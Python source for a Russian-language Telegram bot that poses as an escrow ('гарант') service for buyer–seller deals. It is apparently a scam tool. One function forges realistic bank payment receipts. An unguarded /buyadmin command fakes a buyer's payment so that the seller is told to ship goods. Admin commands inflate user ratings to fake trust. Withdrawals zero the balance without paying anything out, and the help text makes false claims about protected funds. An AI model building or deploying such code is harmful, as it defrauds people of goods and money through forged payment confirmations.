import telebot
from telebot import types
import random
import string
import time
from datetime import datetime, timedelta
from dotenv import load_dotenv
import os

load_dotenv()  # загружает переменные из .env

load_dotenv()  # загружает переменные из .env

token = os.getenv("BOT_TOKEN")   
print("token", token)

bot = telebot.TeleBot(token)  # Замените на ваш токен

# КОНФИГУРАЦИЯ АДМИНИСТРАТОРА
ADMIN_IDS = [6859492950]  # ЗАМЕНИТЕ НА ВАШ ТЕЛЕГРАМ ID

# Базы данных в памяти
users_balance = {}
deals_db = {}
user_states = {}
seller_payment_details = {}
fake_payments = {}
user_stats = {}  # Статистика пользователей: user_id -> {"sales": X, "purchases": Y}
user_info = {}  # Информация о пользователях


def is_admin(user_id):
    return user_id in ADMIN_IDS


def generate_deal_id():
    return ''.join(random.choices(string.digits, k=6))


def generate_payment_id():
    return ''.join(random.choices(string.digits, k=10))


def generate_deal_link(deal_id):
    bot_username = bot.get_me().username
    return f"https://t.me/{bot_username}?start=deal_{deal_id}"


def get_username(user_id):
    try:
        chat = bot.get_chat(user_id)
        return f"@{chat.username}" if chat.username else f"ID: {user_id}"
    except:
        return f"ID: {user_id}"


def get_user_rating(user_id):
    """Возвращает рейтинг пользователя в виде строки"""
    stats = user_stats.get(user_id, {"sales": 0, "purchases": 0})
    return f"★ Продажи: {stats['sales']} | Покупки: {stats['purchases']}"


def update_user_stats(user_id, role):
    """Обновляет статистику пользователя"""
    if user_id not in user_stats:
        user_stats[user_id] = {"sales": 0, "purchases": 0}

    if role == "seller":
        user_stats[user_id]["sales"] += 1
    elif role == "buyer":
        user_stats[user_id]["purchases"] += 1


def generate_realistic_payment_details(amount, currency):
    payment_time = datetime.now() - timedelta(minutes=random.randint(1, 30))
    payment_id = generate_payment_id()

    banks = {
        "RUB": ["Сбербанк", "Тинькофф", "ВТБ", "Альфа-Банк", "Газпромбанк", "Райффайзенбанк"],
        "KZT": ["Kaspi Bank", "Halyk Bank", "ForteBank", "ЦентрКредит", "Банк Home Credit"],
        "UAH": ["ПриватБанк", "Монобанк", "Ощадбанк", "Укрсиббанк", "ПУМБ"]
    }

    bank = random.choice(banks.get(currency, banks["RUB"]))

    return (
        f"🏦 Банк: {bank}\n"
        f"💰 Сумма: {amount} {currency}\n"
        f"🆔 Номер операции: {payment_id}\n"
        f"🕒 Время оплаты: {payment_time.strftime('%d.%m.%Y %H:%M')}\n"
        f"✅ Статус: Успешно"
    )


@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name
    username = message.from_user.username

    # Сохраняем информацию о пользователе
    user_info[user_id] = {
        "username": username,
        "first_name": first_name
    }

    # Инициализация статистики
    if user_id not in user_stats:
        user_stats[user_id] = {"sales": 0, "purchases": 0}

    if len(message.text.split()) > 1:
        deal_param = message.text.split()[1]
        if deal_param.startswith('deal_'):
            deal_id = deal_param.split('_')[1]
            if deal_id in deals_db:
                show_deal_info(message, deal_id)
                return

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton('🛒 Активные сделки')
    btn2 = types.KeyboardButton('➕ Создать сделку')
    btn3 = types.KeyboardButton('📊 Мой профиль')
    btn4 = types.KeyboardButton('ℹ️ Помощь')
    btn5 = types.KeyboardButton('💳 Мои реквизиты')
    markup.add(btn1, btn2, btn3, btn4, btn5)

    welcome_text = (
        f"🌟 Привет, {first_name}!\n"
        "Добро пожаловать в гарант-сервис для безопасных сделок.\n\n"
        "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
        "💼 Вы можете:\n"
        "▫️ Создать сделку как продавец\n"
        "▫️ Присоединиться к сделку как покупатель\n"
        "▫️ Управлять своим балансом\n\n"
        "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
        "Используйте кнопки ниже для навигации"
    )

    if user_id not in users_balance:
        users_balance[user_id] = 0

    bot.send_message(
        message.chat.id,
        welcome_text,
        reply_markup=markup
    )


@bot.message_handler(func=lambda message: message.text == '💳 Мои реквизиты')
def handle_payment_details(message):
    user_id = message.from_user.id

    if user_id in seller_payment_details:
        markup = types.InlineKeyboardMarkup()
        change_btn = types.InlineKeyboardButton(
            text="✏️ Изменить реквизиты",
            callback_data="change_payment_details"
        )
        markup.add(change_btn)

        bot.send_message(
            message.chat.id,
            f"💳 Ваши текущие реквизиты:\n\n{seller_payment_details[user_id]}\n\n"
            "Эти реквизиты будут использоваться для получения платежей в сделках.",
            reply_markup=markup
        )
    else:
        user_states[user_id] = {"step": "enter_payment_details"}
        bot.send_message(
            message.chat.id,
            "💳 Пожалуйста, введите ваши платежные реквизиты:\n\n"
            "Пример: Сбербанк 2200 7000 8000 5500 Иванов И.И."
        )


@bot.message_handler(
    func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'enter_payment_details')
def save_payment_details(message):
    user_id = message.from_user.id
    details = message.text

    if len(details) < 10:
        bot.reply_to(message, "❌ Реквизиты слишком короткие. Пожалуйста, введите полные реквизиты.")
        return

    seller_payment_details[user_id] = details
    del user_states[user_id]

    bot.reply_to(
        message,
        "✅ Реквизиты успешно сохранены!\n\n"
        "Теперь вы можете создавать сделки."
    )


@bot.callback_query_handler(func=lambda call: call.data == "change_payment_details")
def change_payment_details(call):
    user_id = call.from_user.id
    user_states[user_id] = {"step": "enter_payment_details"}
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="💳 Пожалуйста, введите новые платежные реквизиты:"
    )


@bot.message_handler(func=lambda message: message.text == '➕ Создать сделку')
def create_deal_start(message):
    user_id = message.from_user.id

    if user_id not in seller_payment_details:
        bot.send_message(
            message.chat.id,
            "❌ Прежде чем создавать сделку, вам необходимо добавить платежные реквизиты.\n"
            "Пожалуйста, используйте кнопку '💳 Мои реквизиты' в главном меню."
        )
        return

    user_states[user_id] = {"step": "deal_description"}
    bot.send_message(
        message.chat.id,
        "📝 Введите описание товара или услуги для сделки:\n\n"
        "Пример: plush pepe"
    )


@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'deal_description')
def handle_deal_description(message):
    user_id = message.from_user.id
    description = message.text

    user_states[user_id] = {
        "step": "deal_amount",
        "description": description
    }

    bot.send_message(
        message.chat.id,
        "💵 Введите сумму сделки (только цифры):\n\n"
        "Пример: 15000"
    )


@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'deal_amount')
def handle_deal_amount(message):
    user_id = message.from_user.id

    try:
        amount = float(message.text)
        if amount <= 0:
            raise ValueError

        user_states[user_id]['amount'] = amount

        markup = types.InlineKeyboardMarkup(row_width=3)
        btn_rub = types.InlineKeyboardButton("RUB", callback_data="currency_RUB")
        btn_kzt = types.InlineKeyboardButton("KZT", callback_data="currency_KZT")
        btn_uah = types.InlineKeyboardButton("UAH", callback_data="currency_UAH")
        markup.add(btn_rub, btn_kzt, btn_uah)

        bot.send_message(
            message.chat.id,
            "💰 Выберите валюту для сделки:",
            reply_markup=markup
        )

    except:
        bot.reply_to(message, "❌ Некорректная сумма. Введите число больше нуля")


@bot.callback_query_handler(func=lambda call: call.data.startswith('currency_'))
def handle_currency_selection(call):
    user_id = call.from_user.id
    currency = call.data.split('_')[1]

    if user_id not in user_states or 'description' not in user_states[user_id]:
        bot.answer_callback_query(call.id, "❌ Сессия создания сделки устарела")
        return

    deal_id = generate_deal_id()
    deals_db[deal_id] = {
        "description": user_states[user_id]['description'],
        "amount": user_states[user_id]['amount'],
        "currency": currency,
        "status": "active",
        "seller_id": user_id,
        "buyer_id": None
    }

    del user_states[user_id]

    deal_link = generate_deal_link(deal_id)
    deal_info = (
        "✅ СДЕЛКА СОЗДАНА!\n\n"
        f"▫️ Товар: {deals_db[deal_id]['description']}\n"
        f"▫️ Сумма: {deals_db[deal_id]['amount']} {currency}\n"
        "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
        "🔗 Ссылка для покупателя:\n"
        f"{deal_link}\n\n"
        "Поделитесь этой ссылкой с покупателем"
    )

    bot.send_message(call.message.chat.id, deal_info)
    bot.answer_callback_query(call.id)


def show_deal_info(message, deal_id):
    if deal_id not in deals_db:
        bot.reply_to(message, "❌ Сделка не найдена или уже завершена")
        return

    deal = deals_db[deal_id]
    user_id = message.from_user.id

    if deal['status'] == 'completed':
        bot.reply_to(message, "✅ Эта сделка уже успешно завершена")
        return

    # Получаем рейтинг продавца
    seller_rating = get_user_rating(deal['seller_id'])

    if user_id != deal['seller_id']:
        seller_id = deal['seller_id']
        payment_details = seller_payment_details.get(seller_id, "❌ Продавец не указал реквизиты")

        payment_info = (
            f"🛒 СДЕЛКА #{deal_id}\n\n"
            f"▫️ Товар: {deal['description']}\n"
            f"▫️ Сумма: {deal['amount']} {deal['currency']}\n"
            f"▫️ Продавец: скрыт для безопасности\n"
            f"▫️ Рейтинг продавца: {seller_rating}\n"
            "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
            f"💳 Реквизиты для оплаты:\n{payment_details}\n\n"
            "⚠️ После оплаты нажмите кнопку подтверждения"
        )

        markup = types.InlineKeyboardMarkup()
        pay_btn = types.InlineKeyboardButton(
            text="✅ Я оплатил",
            callback_data=f"pay_{deal_id}"
        )
        markup.add(pay_btn)

        bot.send_message(
            message.chat.id,
            payment_info,
            reply_markup=markup
        )
    else:
        status_text = "🟢 Активна" if deal['status'] == 'active' else "🟡 Ожидает получения"
        deal_info = (
            f"📦 ВАША СДЕЛКА #{deal_id}\n\n"
            f"▫️ Товар: {deal['description']}\n"
            f"▫️ Сумма: {deal['amount']} {deal['currency']}\n"
            f"▫️ Статус: {status_text}\n"
            "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
            "🔗 Ссылка для покупателя:\n"
            f"{generate_deal_link(deal_id)}\n\n"
            "Поделитесь этой ссылкой с покупателем"
        )

        bot.send_message(message.chat.id, deal_info)


@bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
def handle_payment_confirmation(call):
    deal_id = call.data.split('_')[1]
    user_id = call.from_user.id

    if deal_id not in deals_db:
        bot.answer_callback_query(call.id, "❌ Сделка не найдена")
        return

    deal = deals_db[deal_id]

    if deal['status'] != 'active':
        bot.answer_callback_query(call.id, "⚠️ Сделка уже завершена")
        return

    deal['status'] = 'waiting_delivery'
    deal['buyer_id'] = user_id

    payment_details = generate_realistic_payment_details(deal['amount'], deal['currency'])

    seller_id = deal['seller_id']
    try:
        # Получаем рейтинг покупателя
        buyer_rating = get_user_rating(user_id)

        bot.send_message(
            seller_id,
            f"💰 ПОКУПАТЕЛЬ ОПЛАТИЛ СДЕЛКУ #{deal_id}\n\n"
            f"▫️ Товар: {deal['description']}\n"
            f"▫️ Сумма: {deal['amount']} {deal['currency']}\n"
            f"▫️ Рейтинг покупателя: {buyer_rating}\n\n"
            f"📝 Детали платежа:\n{payment_details}\n\n"
            "✅ Пожалуйста, отправьте товар покупателю\n\n"
            "ℹ️ Покупатель получит уведомление о необходимости подтвердить получение товара"
        )
    except:
        pass

    markup = types.InlineKeyboardMarkup()
    received_btn = types.InlineKeyboardButton(
        text="📦 Я получил заказ",
        callback_data=f"received_{deal_id}"
    )
    markup.add(received_btn)

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=call.message.text + "\n\n✅ Вы подтвердили оплату. Ожидайте доставку",
        reply_markup=markup
    )

    bot.answer_callback_query(call.id, "✅ Продавец уведомлен об оплате")


@bot.callback_query_handler(func=lambda call: call.data.startswith('received_'))
def handle_goods_received(call):
    deal_id = call.data.split('_')[1]
    user_id = call.from_user.id

    if deal_id not in deals_db:
        bot.answer_callback_query(call.id, "❌ Сделка не найдена")
        return

    deal = deals_db[deal_id]

    if deal['status'] != 'waiting_delivery':
        bot.answer_callback_query(call.id, "⚠️ Статус сделки изменился")
        return

    if user_id != deal['buyer_id']:
        bot.answer_callback_query(call.id, "❌ Вы не покупатель в этой сделке")
        return

    deal['status'] = 'completed'

    seller_id = deal['seller_id']
    if seller_id not in users_balance:
        users_balance[seller_id] = 0
    users_balance[seller_id] += deal['amount']

    # Обновляем статистику
    update_user_stats(seller_id, "seller")
    update_user_stats(user_id, "buyer")

    try:
        bot.send_message(
            seller_id,
            f"🎉 ПОКУПАТЕЛЬ ПОЛУЧИЛ ТОВАР ПО СДЕЛКЕ #{deal_id}\n\n"
            f"▫️ Товар: {deal['description']}\n"
            f"▫️ Сумма: {deal['amount']} {deal['currency']}\n"
            f"▫️ Баланс пополнен: +{deal['amount']} {deal['currency']}\n"
            f"💳 Текущий баланс: {users_balance[seller_id]} {deal['currency']}\n\n"
            f"✅ Ваш рейтинг обновлен: {get_user_rating(seller_id)}"
        )
    except:
        pass

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=call.message.text + "\n\n✅ Вы подтвердили получение товара. Спасибо за сделку!",
        reply_markup=None
    )

    seller_username = get_username(deal['seller_id'])
    buyer_username = get_username(deal['buyer_id'])

    admin_message = (
        "🚀 УСПЕШНО ЗАВЕРШЕНА СДЕЛКА!\n\n"
        f"▫️ ID сделки: #{deal_id}\n"
        f"▫️ Товар: {deal['description']}\n"
        f"▫️ Сумма: {deal['amount']} {deal['currency']}\n"
        f"▫️ Продавец: {seller_username}\n"
        f"▫️ Покупатель: {buyer_username}"
    )

    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(admin_id, admin_message)
        except:
            pass

    bot.answer_callback_query(call.id, "✅ Продавец уведомлен о получении")


@bot.message_handler(commands=['buyadmin'])
def handle_buy_admin(message):
    try:
        deal_id = message.text.split()[1]

        if deal_id not in deals_db:
            bot.reply_to(message, "❌ Сделка не найдена")
            return

        deal = deals_db[deal_id]

        if deal['status'] != 'active':
            bot.reply_to(message, "⚠️ Сделка уже завершена или в процессе")
            return

        payment_details = generate_realistic_payment_details(deal['amount'], deal['currency'])
        fake_payments[deal_id] = payment_details

        deal['status'] = 'waiting_delivery'
        deal['buyer_id'] = message.from_user.id

        seller_id = deal['seller_id']
        try:
            bot.send_message(
                seller_id,
                f"💰 ПОКУПАТЕЛЬ ОПЛАТИЛ СДЕЛКУ #{deal_id}\n\n"
                f"▫️ Товар: {deal['description']}\n"
                f"▫️ Сумма: {deal['amount']} {deal['currency']}\n\n"
                f"📝 Детали платежа:\n{payment_details}\n\n"
                "✅ Пожалуйста, отправьте товар покупателю\n\n"
                "ℹ️ Покупатель получит уведомление о необходимости подтвердить получение товара"
            )
        except:
            pass

        bot.reply_to(message, f"✅ Оплата для сделки #{deal_id} успешно сымитирована!\n"
                              f"Продавец уведомлен о платеже.")

    except IndexError:
        bot.reply_to(message, "❌ Укажите ID сделки: /buyadmin <deal_id>")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}")


@bot.message_handler(commands=['set_my_stats'])
def set_my_stats(message):
    user_id = message.from_user.id

    if not is_admin(user_id):
        bot.reply_to(message, "❌ Эта команда доступна только администраторам")
        return

    try:
        # Формат: /set_my_stats <продажи> <покупки>
        parts = message.text.split()
        if len(parts) < 3:
            raise ValueError

        sales = int(parts[1])
        purchases = int(parts[2])

        if user_id not in user_stats:
            user_stats[user_id] = {"sales": 0, "purchases": 0}

        user_stats[user_id]["sales"] = sales
        user_stats[user_id]["purchases"] = purchases

        bot.reply_to(message, f"✅ Ваша статистика обновлена!\n"
                              f"Продажи: {sales}\n"
                              f"Покупки: {purchases}\n"
                              f"Рейтинг: {get_user_rating(user_id)}")

    except:
        bot.reply_to(message, "❌ Неверный формат команды. Используйте: /set_my_stats <продажи> <покупки>")


@bot.message_handler(commands=['set_user_stats'])
def set_user_stats(message):
    user_id = message.from_user.id

    if not is_admin(user_id):
        bot.reply_to(message, "❌ Эта команда доступна только администраторам")
        return

    try:
        # Формат: /set_user_stats <user_id> <продажи> <покупки>
        parts = message.text.split()
        if len(parts) < 4:
            raise ValueError

        target_user_id = int(parts[1])
        sales = int(parts[2])
        purchases = int(parts[3])

        if target_user_id not in user_stats:
            user_stats[target_user_id] = {"sales": 0, "purchases": 0}

        user_stats[target_user_id]["sales"] = sales
        user_stats[target_user_id]["purchases"] = purchases

        # Получим имя пользователя для отображения
        user_name = user_info.get(target_user_id, {}).get("first_name", f"ID {target_user_id}")

        bot.reply_to(message, f"✅ Статистика пользователя {user_name} обновлена!\n"
                              f"Продажи: {sales}\n"
                              f"Покупки: {purchases}\n"
                              f"Рейтинг: {get_user_rating(target_user_id)}")

    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}\n"
                              "Используйте: /set_user_stats <user_id> <продажи> <покупки>")


@bot.message_handler(func=lambda message: message.text == '📊 Мой профиль')
def show_profile(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name

    if user_id not in users_balance:
        users_balance[user_id] = 0

    # Инициализация статистики, если её нет
    if user_id not in user_stats:
        user_stats[user_id] = {"sales": 0, "purchases": 0}

    stats = user_stats[user_id]

    # Рассчитаем рейтинг на основе статистики
    rating = min(5.0, 4.5 + (stats['sales'] + stats['purchases']) * 0.1)

    info_text = (
        f"👤 ПРОФИЛЬ: {first_name}\n\n"
        f"⭐ Рейтинг: {rating:.1f}/5.0\n"
        f"▫️ Ваш ID: {user_id}\n"
        f"▫️ Баланс: {users_balance[user_id]} RUB\n"
        "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
        f"📦 Успешных продаж: {stats['sales']}\n"
        f"🛒 Успешных покупок: {stats['purchases']}\n"
        f"🏆 Статистика: {get_user_rating(user_id)}\n"
        "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
        "💸 Для вывода средств используйте /withdraw"
    )

    bot.send_message(message.chat.id, info_text)


@bot.message_handler(func=lambda message: message.text == '🛒 Активные сделки')
def show_active_deals(message):
    active = []
    for deal_id, deal in deals_db.items():
        if deal['status'] in ['active', 'waiting_delivery']:
            status = "🟢 Активна" if deal['status'] == 'active' else "🟡 Ожидает получения"
            active.append(f"▫️ #{deal_id} - {deal['description']} - {deal['amount']} {deal['currency']} ({status})")

    if not active:
        bot.reply_to(message, "ℹ️ Сейчас нет активных сделок")
        return

    deals_text = (
            "🆕 АКТИВНЫЕ СДЕЛКИ\n\n" +
            "\n".join(active) +
            "\n➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
            "Для участия в сделке перейдите по ссылке от продавца"
    )

    bot.send_message(message.chat.id, deals_text)


@bot.message_handler(commands=['withdraw'])
def handle_withdraw(message):
    user_id = message.from_user.id

    if user_id not in users_balance:
        users_balance[user_id] = 0

    if users_balance[user_id] <= 0:
        bot.reply_to(message, "❌ На вашем балансе недостаточно средств для вывода")
        return

    user_states[user_id] = {"step": "withdraw_details", "amount": users_balance[user_id]}
    bot.send_message(
        message.chat.id,
        f"💳 Введите реквизиты для вывода {users_balance[user_id]} RUB:\n\n"
        "Пример: Сбербанк 2200 7000 8000 5500"
    )


@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'withdraw_details')
def handle_withdraw_details(message):
    user_id = message.from_user.id
    details = message.text

    amount = user_states[user_id]['amount']
    users_balance[user_id] = 0

    bot.send_message(
        message.chat.id,
        f"✅ ЗАПРОС НА ВЫВОД {amount} RUB ОТПРАВЛЕН!\n\n"
        f"▫️ Реквизиты: {details}\n"
        "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
        "⚠️ Вывод средств будет выполнен в течение 2 рабочих дней\n\n"
        "Спасибо за использование нашего сервиса!"
    )

    del user_states[user_id]


@bot.message_handler(commands=['add_balance'])
def handle_add_balance(message):
    user_id = message.from_user.id

    if not is_admin(user_id):
        bot.reply_to(message, "❌ Эта команда доступна только администраторам")
        return

    try:
        parts = message.text.split()
        if len(parts) < 3:
            raise ValueError

        target_user_id = int(parts[1])
        amount = float(parts[2])

        if target_user_id not in users_balance:
            users_balance[target_user_id] = 0

        users_balance[target_user_id] += amount

        bot.reply_to(message, f"✅ Баланс пользователя {target_user_id} пополнен на {amount} RUB")

    except:
        bot.reply_to(message, "❌ Неверный формат команды. Используйте: /add_balance <user_id> <amount>")


@bot.message_handler(func=lambda message: message.text == 'ℹ️ Помощь')
def show_help(message):
    help_text = (
        "ℹ️ КОМАНДЫ И ИНСТРУКЦИЯ\n\n"
        "▫️ /start - Главное меню\n"
        "▫️ /withdraw - Вывод средств\n"
        "▫️ /support - Связаться с поддержкой\n"
        "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
        "🛒 Как создать сделку:\n"
        "1. Добавьте реквизиты в '💳 Мои реквизиты'\n"
        "2. Нажмите 'Создать сделку'\n"
        "3. Введите описание товара\n"
        "4. Введите сумму\n"
        "5. Выберите валюту\n"
        "6. Поделитесь ссылкой с покупателем\n\n"
        "💰 Как купить товар:\n"
        "1. Перейдите по ссылке от продавца\n"
        "2. Оплатите товар по реквизитам\n"
        "3. Нажмите 'Я оплатил'\n"
        "4. После получения товара нажмите 'Я получил заказ'\n\n"
        "💳 Требования:\n"
        "▫️ Продавцам необходимо добавить платежные реквизиты\n"
        "▫️ Все сделки защищены гарантом\n"
        "▫️ Средства хранятся на защищенных счетах\n\n"
        "💸 Вывод средств осуществляется в течение 2 рабочих дней\n"
        "🛡️ Гарант безопасных сделок с 2023 года"
    )

    bot.reply_to(message, help_text)


@bot.message_handler(commands=['support'])
def handle_support(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name

    markup = types.InlineKeyboardMarkup()
    support_btn = types.InlineKeyboardButton(
        text="👨‍💼 Написать в поддержку",
        url="https://t.me/your_support_username"
    )
    markup.add(support_btn)

    bot.send_message(
        message.chat.id,
        f"🛟 Техническая поддержка\n\n"
        f"Привет, {first_name}!\n"
        "Если у вас возникли проблемы с использованием бота или сделкой, "
        "наша служба поддержки готова помочь.\n\n"
        "Нажмите кнопку ниже, чтобы связаться с оператором:",
        reply_markup=markup
    )


def send_reminders():
    now = time.time()
    for deal_id, deal in list(deals_db.items()):
        if deal['status'] == 'waiting_delivery' and 'last_reminder' not in deal:
            seller_id = deal['seller_id']
            try:
                bot.send_message(
                    seller_id,
                    f"⏰ НАПОМИНАНИЕ ПО СДЕЛКЕ #{deal_id}\n\n"
                    f"Покупатель уже оплатил товар {deal['amount']} {deal['currency']}.\n"
                    "Пожалуйста, отправьте товар как можно скорее.\n\n"
                    "После отправки сообщите покупателю трек-номер для отслеживания.\n\n"
                    "⚠️ Средства будут заморожены до подтверждения получения товара покупателем."
                )
                deal['last_reminder'] = now
            except:
                pass

        elif deal['status'] == 'waiting_delivery' and now - deal.get('last_reminder', 0) > 86400:
            buyer_id = deal['buyer_id']
            try:
                bot.send_message(
                    buyer_id,
                    f"⏰ НАПОМИНАНИЕ ПО СДЕЛКЕ #{deal_id}\n\n"
                    f"Продавец должен был отправить товар {deal['description']}.\n"
                    "Если вы уже получили товар, пожалуйста, подтвердите получение.\n\n"
                    "Если возникли проблемы или задержки, используйте команду /support"
                )
                deal['last_reminder'] = now
            except:
                pass


@bot.message_handler(func=lambda m: True)
def handle_other(message):
    text = message.text.lower()

    if text in ['привет', 'hi', 'hello']:
        bot.reply_to(message, f"👋 Привет, {message.from_user.first_name}!")
    elif text in ['спасибо', 'благодарю', 'thanks']:
        bot.reply_to(message, "🙏 Пожалуйста! Обращайтесь, если понадобится помощь.")
    elif text in ['гарант', 'guarantee', 'безопасность']:
        bot.reply_to(message, "🛡️ Все сделки защищены гарантийным сервисом:\n"
                              "- Средства хранятся на защищенных счетах\n"
                              "- Продавец получает оплату только после получения товара\n"
                              "- Поддержка 24/7 для решения спорных ситуаций\n"
                              "- Система рейтинга для надежных участников")
    elif text in ['статус', 'status']:
        bot.reply_to(message, "🟢 Бот работает в штатном режиме\n"
                              "Все системы функционируют нормально\n"
                              "Последнее обновление: 02.07.2025")
    else:
        bot.reply_to(message, "ℹ️ Используйте кнопки меню для навигации или /help для помощи")


if __name__ == "__main__":
    print("⚡ Бот запущен...")
    print(f"Администраторы: {ADMIN_IDS}")

    import threading


    def reminder_loop():
        while True:
            try:
                send_reminders()
            except Exception as e:
                print(f"Ошибка в напоминаниях: {e}")
            time.sleep(3600)


    reminder_thread = threading.Thread(target=reminder_loop, daemon=True)
    reminder_thread.start()

    bot.infinity_polling()